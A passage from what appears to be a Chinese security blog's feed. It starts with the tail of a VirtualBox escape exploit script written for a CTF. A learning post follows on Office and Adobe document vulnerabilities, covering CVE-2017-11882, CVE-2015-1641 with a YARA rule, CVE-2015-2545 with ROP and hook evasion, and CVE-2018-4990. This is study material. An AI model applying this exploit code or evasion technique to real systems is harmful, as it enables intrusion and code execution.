self.crVBoxHGCMFree)</span><br><span class="line"></span><br><span class="line">        libbase = self.crVBoxHGCMFree - <span class="number">0x20650</span></span><br><span class="line">        self.system = self.read64(libbase + <span class="number">0x22e3d0</span>, canfail=<span class="literal">True</span>) - <span class="number">0x122ec0</span> + <span class="number">0x4f440</span></span><br><span class="line">        print(<span class="string">'[*] Leaked system @ 0x%016x'</span> % self.system)</span><br><span class="line">​</span><br><span class="line">        self.write64(self.pConn + <span class="number">0x128</span>, self.system)</span><br><span class="line">        self.write(self.pConn, <span class="string">"mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt\x00"</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">        hgcm_disconnect(self.client1)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Pwn()</span><br><span class="line">    p.setup()</span><br><span class="line">    <span class="comment">#if raw_input('you want RIP control? [y/n] ').startswith('y'):</span></span><br><span class="line">    <span class="comment">#    p.rip(0xdeadbeef)</span></span><br></pre></td></tr></table></figure><h3 id="进一步思考"><a href="#进一步思考" class="headerlink" title="进一步思考"></a>进一步思考</h3><p>官方修了两处信息泄露，并没有修溢出，当没有leak里，我们依然有<code>任意地址写</code>和<code>堆越界写</code>。</p><p>我们进一步思考如何利用堆溢出再实现信息泄露：</p><ol><li>在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer。</li><li>越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分。</li><li>通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读。</li></ol><p>如果在CR_GETUNIFORMLOCATION_EXTEND Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继Linux内核、浏览器、文档型漏洞，虚拟机应该是最后一块了，（从目前我入门二进制漏洞实战来看。主要是针对VM Ware和Virtual Box。&lt;/p&gt;
&lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="vm" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/vm/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="vm" scheme="https://github.com/Cracke-S-J/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>文档型漏洞入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/05/04/%E6%96%87%E6%A1%A3%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/Cracke-S-J/2020/05/04/%E6%96%87%E6%A1%A3%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-04T15:04:45.000Z</published>
    <updated>2020-06-07T10:31:17.899Z</updated>
    
    <content type="html"><![CDATA[<p>在我眼中，文档型漏洞就是，Office系列跟Adobe系列，或者其它要解析文档的程序，解析文档有内存控制问题，达到恶意文档可以产生RCE的目的。可能还有一些Word解析公式的问题，暂且都归为文档型，因为具体叫什么怎么分，我也不会分。还有VS Code的RCE的问题，不知道能不能算文档型。</p><p>感觉基本就是将在CTF pwn题中学到的东西投入现实使用了。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p><a href="http://www.greyhathacker.net/" target="_blank" rel="noopener">Dokany/Google Drive File Stream Kernel Stack-based Buffer Overflow Vulnerability</a></p><h3 id="PDF文件解析与恶代分析"><a href="#PDF文件解析与恶代分析" class="headerlink" title="PDF文件解析与恶代分析"></a><a href="https://zhuanlan.zhihu.com/p/30597307" target="_blank" rel="noopener">PDF文件解析与恶代分析</a></h3><h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><ul><li>文件头——指明了该文件所遵从的PDF规范的版本号，它出现在PDF文件的第一行。</li><li>文件体——又称对象集合，PDF文件的主要部分，由一系列对象组成。</li><li>交叉引用表——对对象进行随机存取而设立的一个间接对象的地址索引表。（实际以偏移+索引的方式储存对象地址，下文会提及）</li><li>文件尾——声明了交叉引用表的地址，即指明了文件体的根对象（Catalog），从而能够找到PDF文件中各个对象体的位置，达到随机访问。另外还保存了PDF文件的加密等安全信息。文件尾说明了根对象的对象号，并且说明交叉引用表的位置，通过对交叉引用表的查询可以找到目录对象(Catalog)。</li></ul><h4 id="然后大致结构组织是这样的"><a href="#然后大致结构组织是这样的" class="headerlink" title="然后大致结构组织是这样的"></a>然后大致结构组织是这样的</h4><ul><li>文件头<ul><li>目录对象</li><li>Pages Root<ul><li>Page1页面（page）对象为PDF中最重要的对象，包含如何显示该页面的信息，例如使用的字体，包含的内容（文字，图片等），页面的大小。里面的信息可以直接给出，当然里面的子项更多的是对其他对象的引用，真正的信息存放在其他对象里面。页面中包含的信息是包含在一个称为流（stream）的对象里，这个流的长度（字节数）必须直接给出或指向另外一个对象（包含一个整数值，表明这个流的长度）。</li><li>Page2</li></ul></li><li>Outline Root</li></ul></li></ul><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">obj            <span class="comment">#obj对象开始</span></span><br><span class="line">endobj         <span class="comment">#obj对象结束</span></span><br><span class="line">stream         <span class="comment">#stream流对象开始</span></span><br><span class="line">endstream      <span class="comment">#stream流对象结束</span></span><br><span class="line">xref           <span class="comment">#交叉引用表开始</span></span><br><span class="line">trailer        <span class="comment">#文件尾对象开始</span></span><br><span class="line">startxref      <span class="comment">#交叉引用表结束</span></span><br><span class="line">/Page          <span class="comment">#文件页数</span></span><br><span class="line">/Encrypt       <span class="comment">#是否加密</span></span><br><span class="line">/ObjStm        <span class="comment">#objectstreams的数量，objectstreams可包含其他Object对象，即嵌套</span></span><br><span class="line">/JS            <span class="comment">#代表javascript嵌有JavaScript代码，可直接提取恶意代码</span></span><br><span class="line">/JavaScript    <span class="comment">#代表javascript嵌有JavaScript代码，可直接提取恶意代码</span></span><br><span class="line">/AA            <span class="comment">#以下三个为特定特征，打开对象自动执行</span></span><br><span class="line">/OpenAction</span><br><span class="line">/AcroForm</span><br><span class="line">/URI           <span class="comment">#内嵌url链接</span></span><br><span class="line">/Filter        <span class="comment">#/Filter字段出现，表示了下面的stream流进行了加密</span></span><br><span class="line">/RichMedia     <span class="comment">#富文本</span></span><br><span class="line">/Launch        <span class="comment">#执行Action的次数与OpenAction字段关联</span></span><br><span class="line"><span class="comment">#/xxxx 带斜杠的关键字包含在&lt;&lt;&gt;&gt;字典内部</span></span><br></pre></td></tr></table></figure><h4 id="流的提取"><a href="#流的提取" class="headerlink" title="流的提取"></a>流的提取</h4><p>/Filter关键字之后保存了stream流的编码信息一共包括以下几种：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/FlateDecode</span><br><span class="line">/ASCIIHexDecode</span><br><span class="line">/ASCII85Decode</span><br><span class="line">/LZWDecode</span><br><span class="line">/DCTDecode</span><br><span class="line">/RunLengthDecode</span><br><span class="line">/CCITTFaxDecode</span><br><span class="line">/JBIG2Decode</span><br><span class="line">/JPXDecode</span><br><span class="line">/Crypt</span><br></pre></td></tr></table></figure><h4 id="还有一些其它对抗的坑"><a href="#还有一些其它对抗的坑" class="headerlink" title="还有一些其它对抗的坑"></a>还有一些其它对抗的坑</h4><ul><li>引用表偏移不正确</li><li>引用表可以有多个</li><li>流对象长度可以直接跟对象</li><li>流对象长度可以为任意值</li><li>javascript可以支持文本和八进制</li><li>编码方式缩写形式</li><li>编码形式可以级联</li></ul><h3 id="位图简介"><a href="#位图简介" class="headerlink" title="位图简介"></a>位图简介</h3><h4 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h4><p>Bitmap File Header<br>Bitmap Info Header<br>RGBQUAD Array<br>Bitmap Data</p><h5 id="Bitmap-File-Header"><a href="#Bitmap-File-Header" class="headerlink" title="Bitmap File Header"></a>Bitmap File Header</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 文件标记 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// 位图文件的大小</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// 位图数据在文件中的偏移值</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h5 id="BITMAP-INFO-HEADER"><a href="#BITMAP-INFO-HEADER" class="headerlink" title="BITMAP INFO HEADER"></a>BITMAP INFO HEADER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// 未使用压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// RLE8 压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// RLE4 压缩算法</span></span></span><br><span class="line"><span class="comment">// 其他压缩算法...</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// 结构体的大小</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// 位图宽度</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// 位图高度</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// 必须为 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// 每个像素所占用的位数</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// 压缩算法</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// 数据大小</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// 水平分辨率</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// 垂直分辨率</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// 色彩索引数</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// 必须的色彩索引数</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><h5 id="RGBQUAD-ARRAY"><a href="#RGBQUAD-ARRAY" class="headerlink" title="RGBQUAD ARRAY"></a>RGBQUAD ARRAY</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><h5 id="BITMAP-DATA"><a href="#BITMAP-DATA" class="headerlink" title="BITMAP DATA"></a>BITMAP DATA</h5><p>位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。</p><p>有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。</p><h3 id="RLE-编码"><a href="#RLE-编码" class="headerlink" title="RLE 编码"></a>RLE 编码</h3><h4 id="RLE8"><a href="#RLE8" class="headerlink" title="RLE8"></a>RLE8</h4><p>RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 编码模式（Encoded Mode） 和 绝对模式（Absolute Mode） 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p>编码模式 包含两字节数据：</p><ul><li>如果第一个字节不为零，其含义为第二个字节需要重复的次数</li><li>如果第一个字节为零，那么第二个字节的可能含义如下<ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 (deltaX, deltaY) 为当前坐标 (x, y) 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 [0x03, 0xFF] 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 WORD 对齐）。</p><p>下面为 RLE8 压缩之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="RLE4-编码"><a href="#RLE4-编码" class="headerlink" title="RLE4 编码"></a>RLE4 编码</h4><p>RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 编码模式（Encoded Mode） 和 绝对模式（Absolute Mode） 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p>编码模式 包含两字节数据：</p><ul><li>如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数<ul><li>第二个字节代表了两个像素的色彩索引</li><li>高 4 位代表第一个像素的色彩索引</li><li>低 4 位代表第二个像素的色彩索引</li><li>二者依次交替重复，直到得到第一个字节指定的像素个数</li></ul></li><li>如果第一个字节为零，那么第二个字节的可能含义如下<ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 (deltaX, deltaY) 为当前坐标 (x, y) 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 [0x03, 0xFF] 。第二个字节表示接下来特定数量的 半字节 是未压缩的数据（数据量需要按 WORD 对齐）。</p><p>下面为 RLE4 压缩之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h3 id="SpiderMonkey-基础知识"><a href="#SpiderMonkey-基础知识" class="headerlink" title="SpiderMonkey 基础知识"></a>SpiderMonkey 基础知识</h3><p>Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 SpiderMonkey。</p><h3 id="怎么执行js代码"><a href="#怎么执行js代码" class="headerlink" title="怎么执行js代码"></a>怎么执行js代码</h3><p>为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 subform 的 initialize 事件和 docReady 事件设置事件处理代码来完成。</p><p>总之就是可以设置事件处理代码。</p><h2 id="“噩梦公式漏洞”：CVE-2017-11882-Microsoft-Office-Word-栈溢出漏洞"><a href="#“噩梦公式漏洞”：CVE-2017-11882-Microsoft-Office-Word-栈溢出漏洞" class="headerlink" title="“噩梦公式漏洞”：CVE-2017-11882 Microsoft Office Word 栈溢出漏洞"></a>“噩梦公式漏洞”：CVE-2017-11882 Microsoft Office Word 栈溢出漏洞</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-11/CVE-2017-11882-analysis/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-11/CVE-2017-11882-analysis/</a></p><p>这个是一个栈溢出。<a href="https://github.com/embedi/CVE-2017-11882/blob/master/example/exploit.rtf">POC</a>长这样。</p><p>由于EQNEDT32.EXE在解析Equation.3 OLE对象中的MTEF数据流里的font类型记录时，没有对font name的长度进行判断，将其复制入0x28大小的栈空间时可发生溢出，并可覆盖返回地址。由于存在漏洞的EQNEDT32.EXE年代久远，没有开启ASLR、GS等漏洞缓解措施，只需要简单的将返回地址覆盖成同模块内的call WinExec()指令地址即可稳定地完成漏洞利用。</p><h2 id="CVE-2015-1641-Word-利用样本分析-类型混淆"><a href="#CVE-2015-1641-Word-利用样本分析-类型混淆" class="headerlink" title="CVE-2015-1641 Word 利用样本分析 类型混淆"></a>CVE-2015-1641 Word 利用样本分析 类型混淆</h2><p><a href="https://paper.seebug.org/351/" target="_blank" rel="noopener">https://paper.seebug.org/351/</a></p><p>基本是一波调试分析POC。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>smartTag标签是用于word和excel中的智能标签，针对人名、日期、时间、地址、电话号码等进行智能识别并允许用户执行特定操作的标签。比如如果Steve Jobs被识别为人名，则smartTag标签可以执行诸如打开通讯录、添加到联系人、预约会议等操作，给office用户提供更多自定义的智能选择。displacedByCustomXml在很多标签中都可以使用，目的是当前标签处需要被一个customXML中的内容代替，它的值是next表示被下一个customXML代替，prev则表示被上一个代替。</p><p>这个漏洞是一个类型混淆漏洞，本来带有displacedByCustomXml的标签会被上一个或下一个customXML代替，但是word没有对传入的customXML对象进行严格的校验，导致可以传入诸如smartTag对象，然而smartTag对象的处理流程和customXML并不相同，上述特殊处理的smartTag标签中的element属性值会被当作是一个地址，随后经过简单的计算得到另一个地址。最后处理流程会将moveFromRangeEnd的id值覆盖到之前计算出来的地址中，导致任意内存写入。</p><p>总之就是微软没有分清自家亲兄弟<code>customXML</code>和<code>smartTag</code>，造成的类型混淆。</p><h3 id="然后就是堆喷常规的套路"><a href="#然后就是堆喷常规的套路" class="headerlink" title="然后就是堆喷常规的套路"></a>然后就是堆喷常规的套路</h3><ol><li>先要加载msvcr71.dll，它没开地址随机化保护，有稳定的对象用。</li><li>使用40个ActiveX控件进行堆喷，可以参考<a href="https://weiyiling.cn/one/cve_2013_3906_ms13-096" target="_blank" rel="noopener">这里</a>。</li><li>对smartTag_1（第一个smartTag标签）的element属性值进行简单计算得到一个地址addr1；</li><li>将其moveFromRangeEnd_1子标签的id写入到addr1中备用；</li><li>解析smartTag_2，根据他的element属性值和前面计算出来的addr1共同计算出另一个地址addr2，并将其子标签moveFromRangeEnd_2的id写入到addr2，而addr2是一个虚函数表中的地址，这样原本是这个虚函数的地址就被覆盖成攻击者想要执行的任意代码的地址，漏洞利用成功。</li></ol><h3 id="漏洞利用检测"><a href="#漏洞利用检测" class="headerlink" title="漏洞利用检测"></a>漏洞利用检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule CVE_2015_1641</span><br><span class="line">&#123;</span><br><span class="line">       meta:</span><br><span class="line">              description=<span class="string">"Word Type Confusion Vulnerability"</span></span><br><span class="line">              output=<span class="string">"Nday &amp; CVE-2015-1641"</span></span><br><span class="line">       strings:</span><br><span class="line">              $smart_tag=/&lt;w:smartTag[\w\W]+?w:element=\<span class="string">"(&amp;#x[a-zA-Z0-9]&#123;4&#125;;)&#123;2&#125;\"&gt;[\w\W]+?&lt;w:permStart[\w\W]+?w:displacedByCustomXml=\"prev\"\/&gt;[\w\W]+?&lt;w:permEnd[\w\W]+?&lt;\/w:smartTag&gt;/</span></span><br><span class="line"><span class="string">       condition:</span></span><br><span class="line"><span class="string">              $smart_tag</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://weiyiling.cn/one/cve_2015_1641_ms15-033" target="_blank" rel="noopener">这篇</a>说的也比较清楚。</p><h2 id="CVE-2015-2545-Word-利用样本分析-UAF"><a href="#CVE-2015-2545-Word-利用样本分析-UAF" class="headerlink" title="CVE-2015-2545 Word 利用样本分析 UAF"></a>CVE-2015-2545 Word 利用样本分析 UAF</h2><p><a href="https://paper.seebug.org/368/" target="_blank" rel="noopener">https://paper.seebug.org/368/</a></p><p>PostScript相关，解析图形文件时有UAF。当通过 forall 操作 dict2 对象时，将对 dict2 中的 ‘key-value’ 进行迭代处理，且 pNext 指针指向下一对待处理的 ‘key-value’。然而，proc 中存在 dict1 dict2 copy 的操作，此过程会先释放掉 dict2 原有的 ‘key-value’ 空间，之后再申请新空间进行接下来的拷贝，即原先 pNext 指向的 ‘key-value’ 空间被释放了。而后在 putinterval 操作中将重新用到原先 pNext 指向的空间，并向其中写入特定的字符串。因此，在下一次迭代时，pNext 指向的数据就变成了我们所构造的 ‘key-value’。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>PostScript是office用来解析图形的jio本。它跟office的关系和v8跟chrome的关系差不多。</p><p>在 PostScript 中会为每个 string 对象分配专门的 buffer 用于存储实际的字符串内容，其基址及大小就保存在该 string 对象中。就最终样本伪造的 string 对象来说，其 buffer 基址为 0x00000000，且大小为 0x7fffffff，因此借助此对象可以实现任意内存的读写。</p><p>小技巧来绕过保护程序对 ZwProtectVirtualMemory 调用的检测，对于 ntdll 模块中的 Nt/Zw 函数，除了赋给 eax 寄存器的 id 不同外，其余部分都是相同的。ROP 链在完成 eax 的赋值后，也就是将 ZwProtectVirtualMemory 函数中的 id 赋给 eax 后，会直接跳过 ZwCreateEvent 函数（该函数未被 hook）的前5字节并执行余下的那部分指令，通过这种方式能实现任意的系统调用而不会被检测到。</p><p>总之就修改指针到ROP链上。</p><h2 id="PDF漏洞（CVE-2018-12794）浅析"><a href="#PDF漏洞（CVE-2018-12794）浅析" class="headerlink" title="PDF漏洞（CVE-2018-12794）浅析"></a>PDF漏洞（CVE-2018-12794）浅析</h2><p><a href="https://www.anquanke.com/post/id/177861" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177861</a></p><p>先介绍下什么是XDP。</p><p>XML Data Package（XDP）是Adobe Systems创建的XML 文件格式。该格式允许将PDF内容或Adobe XML Forms Architecture（XFA）资源打包在XML 容器中。XDP符合XML 1.0的规范，可以作为独立文档，也可以在PDF文档中携带。XDP提供了一种在XML容器中打包表单组件的机制，XDP还可以打包PDF文件以及XML表单和模板数据。</p><p>然后通过调试POC，分析crash的点，推测出来，漏洞的根本原因是代码在处理Template对象时使用了Form对象的函数进行处理，造成了类型混淆漏洞。</p><h2 id="E-2018-4990-Adobe-Reader代码执行漏洞利用分析"><a href="#E-2018-4990-Adobe-Reader代码执行漏洞利用分析" class="headerlink" title="E-2018-4990 Adobe Reader代码执行漏洞利用分析"></a>E-2018-4990 Adobe Reader代码执行漏洞利用分析</h2><p><a href="https://www.freebuf.com/articles/system/173095.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/173095.html</a></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>2018年5月15日，ESET发布文章“A tale of two zero-days”，该文章披露了今年3月ESET在恶意软件扫描引擎（VirusTotal）上捕获了一个用于攻击测试的PDF文档。该PDF文档样本包含两枚0-day漏洞（CVE-2018-4990，CVE-2018-8120）以实现针对Adobe Acrobat/Reader PDF阅读器的任意代码执行。其中CVE-2018-4990为Adobe PDF阅读器的代码执行漏洞，而CVE-2018-8120则是Windows操作系统Win32k的内核提权漏洞，在获取代码执行权限后通过内核提权漏洞绕过Adobe PDF阅读器的沙盒保护，实现任意代码执行。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h4 id="poi-poi-esi-0×48-0x0c-这个被遍历的地址是如何被分配的"><a href="#poi-poi-esi-0×48-0x0c-这个被遍历的地址是如何被分配的" class="headerlink" title="poi(poi(esi+0×48)+0x0c)这个被遍历的地址是如何被分配的"></a>poi(poi(esi+0×48)+0x0c)这个被遍历的地址是如何被分配的</h4><p>通过调试回溯，我们找到了具体的jp2h解析函数，其对应的参数如下：参数1：getField(“Button1″)获取的图片的实际大小；参数2：poi(poi(esi+0×48)+0x0c)；参数3：图片的对象，可以看到包含的具体图片内容；函数调用前，poi(poi(esi+0×48)+0x0c)这个地址初始化为零，继续跟踪调试可以看到，给poi(poi(esi+0×48)+0x0c)分配的内存地址大小为0x3f4，即一个a1中的hole，而图片的实际大小则是0x3f4，正好用于填补a1的hole，poi(poi(esi+0×48)+0x0c)为pg2h解析时分配，其实际大小和图片大小一致（0x3f4），正好填补a1中的hole，而在loop逻辑处理poi(poi(esi+0×48)+0x0c)时，由于长度为0xfe（0xfe*4 = 0x3f8），所以越界8字节刚好读到hole中残留的攻击者部署地址。</p><h4 id="poi-poi-esi-0×48-0×04-处的0xff来自何处"><a href="#poi-poi-esi-0×48-0×04-处的0xff来自何处" class="headerlink" title="poi(poi(esi+0×48)+0×04)处的0xff来自何处"></a>poi(poi(esi+0×48)+0×04)处的0xff来自何处</h4><p>其中控制loop循环次数的0xff，实际在poi(poi(esi+0×48)+0×4)的位置。通过回溯分析，发现该值同样来自pg2h函数中的解析。调试知道，其赋值来自于pg2h第三个参数，图片对象+10的位置。这个变量主要用于标记解析图片时的指针，当解析图片时，该指针从图片的开始一直递加，直到图片尾部，如下图所示为扫描到图片中间时的值。扫描完之后发现该指针指向后面的一片fffffff的内容，此时通过该指针给poi(poi(esi+0×48)+0×4)赋值时即为对应的0xff，从而导致之后的越界读（这个地方感觉应该是pclr后面应该还有字段，突然截断了导致了一个错误的残留指针）。</p><h3 id="漏洞利用回溯分析"><a href="#漏洞利用回溯分析" class="headerlink" title="漏洞利用回溯分析"></a>漏洞利用回溯分析</h3><p>JavaScript代码中则通过两个Array实例sprayarr及a1来实现内存Spray布局，这里需要注意的是a1对Array中奇数下标的element进行了释放，这是UAF类漏洞利用中常见的一种内存布局手法。</p><p>通过sprayarra2赋值抢占该0×20000的内存，一旦分配成功，即变相的将sprayarr中0x0d0f0048位置的element的长度从0xffe8修改为0x11fe8。</p><h3 id="整个漏洞利用过程"><a href="#整个漏洞利用过程" class="headerlink" 